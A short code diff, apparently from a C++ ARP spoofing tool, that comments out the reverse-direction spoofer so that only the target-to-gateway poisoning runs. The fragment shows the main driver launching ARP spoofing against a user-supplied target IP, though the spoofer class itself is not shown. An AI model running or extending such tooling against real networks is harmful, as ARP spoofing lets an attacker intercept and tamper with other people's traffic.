@@ -49,14 +49,14 @@ int main(int argc,char* argv[])
     }
     inet_ntop(AF_INET,&gatewayip.s_addr,gateway,sizeof(gateway));
     ARPSpoofer arpc(dev,argv[1],gateway);
-    ARPSpoofer arpd(dev,gateway,argv[1]);
+  //  ARPSpoofer arpd(dev,gateway,argv[1]);
     cout << "[*] start arp spoofing" << endl;
     arpc.startarpspoofing();
-    arpd.startarpspoofing();
+    //arpd.startarpspoofing();
     cout << "Press Anykey to stop";
     cin.get();
     arpc.stoparpspoofing();
-    arpd.stoparpspoofing();
+    //arpd.stoparpspoofing();
     return 0;
 
 }
